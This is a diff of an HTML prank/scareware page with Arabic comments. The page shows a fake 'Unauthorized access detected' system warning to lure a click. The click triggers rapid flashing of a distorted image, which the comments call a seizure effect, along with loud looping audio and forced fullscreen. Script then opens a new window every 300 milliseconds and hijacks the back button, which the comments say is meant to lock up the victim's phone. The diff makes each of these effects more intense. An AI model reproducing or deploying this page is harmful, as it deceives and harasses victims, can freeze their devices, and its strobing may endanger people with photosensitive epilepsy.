@@ -3,66 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL_FAILURE ⚠️</title>
+    <title>⚠️ SYSTEM_FAILURE_DETECTED ⚠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة: تغطي كامل الهاتف مع "رعشة" قوية سواسوة */
+        /* صورة المرأة: تغطي الشاشة مع حركة "الرعشة الهستيرية" سواسوة */
         #stalkerEntity { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 1; display: none;
             filter: contrast(300%) brightness(30%);
-            animation: seizure 0.05s infinite;
+            animation: hyperSeizure 0.03s infinite; /* سرعة جنونية سواسوة */
         }
 
-        @keyframes seizure {
-            0% { transform: translate(3px, 3px); filter: hue-rotate(0deg); }
-            50% { transform: translate(-3px, -5px); filter: hue-rotate(10deg); }
-            100% { transform: translate(2px, 4px); filter: hue-rotate(0deg); }
+        @keyframes hyperSeizure {
+            0% { transform: translate(4px, 4px) rotate(0deg); }
+            33% { transform: translate(-4px, -2px) rotate(-1deg); filter: hue-rotate(30deg); }
+            66% { transform: translate(2px, -4px) rotate(1deg); }
+            100% { transform: translate(-2px, 3px) rotate(0deg); }
         }
 
-        #warning { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; }
+        #warningUI { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: 'Courier New', monospace; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        .btn { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
+        .btn-critical { background: #f00; color: #000; border: none; padding: 25px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; font-size: 1.2em; }
     </style>
 </head>
-<body onclick="launchNightmare()">
+<body onclick="engageInfiniteHell()">
 
-    <div id="warning">
-        <h1 class="blink">☢️ FATAL ERROR ☢️</h1>
-        <p>Your system has been compromised.<br>Press OK to attempt recovery.</p>
-        <button class="btn">OK / REPAIR</button>
+    <div id="warningUI">
+        <h1 class="blink">☢️ TERMINAL ERROR ☢️</h1>
+        <p>CRITICAL: Unauthorized access detected.<br>Click OK to authorize system repair.</p>
+        <button class="btn-critical">OK / FIX SYSTEM</button>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <audio id="s1" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3" type="audio/mpeg"></audio>
-    <audio id="s2" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3" type="audio/mpeg"></audio>
-    <audio id="s3" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3" type="audio/mpeg"></audio>
-    <audio id="s4" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3" type="audio/mpeg"></audio>
-    <audio id="s5" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3" type="audio/mpeg"></audio>
+    <div id="audioContainer">
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3" type="audio/mpeg"></audio>
+        
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3" type="audio/mpeg"></audio>
+        <audio class="hellAudio" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3" type="audio/mpeg"></audio>
+    </div>
 
     <script>
-        function launchNightmare() {
-            // تشغيل كامل الأصوات في وقت واحد سواسوة
-            for(let i=1; i<=5; i++) {
-                let s = document.getElementById('s'+i);
-                s.volume = 1.0;
-                s.play();
-            }
+        function engageInfiniteHell() {
+            // تشغيل كل الأصوات وضمان التكرار الأبدي سواسوة
+            const audios = document.querySelectorAll('.hellAudio');
+            audios.forEach(audio => {
+                audio.volume = 1.0;
+                audio.play();
+                // ميزة التأكد من إعادة التشغيل في حال التوقف سواسوة
+                audio.addEventListener('ended', function() {
+                    this.currentTime = 0;
+                    this.play();
+                }, false);
+            });
 
-            document.getElementById('warning').style.display = 'none';
+            document.getElementById('warningUI').style.display = 'none';
             document.getElementById('stalkerEntity').style.display = 'block';
             document.documentElement.requestFullscreen();
 
-            // نظام "الحبس" ومنع الهروب سواسوة
+            // نظام "الحبس واللاق" لتبليك الهاتف سواسوة
             setInterval(() => {
-                // فتح نوافذ جديدة لتبليك المتصفح (100 صفحة) سواسوة
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-                // منع زر الرجوع سواسوة
                 history.pushState(null, null, window.location.href);
-            }, 400);
+            }, 300);
         }
         window.onpopstate = () => history.go(1);
     </script>
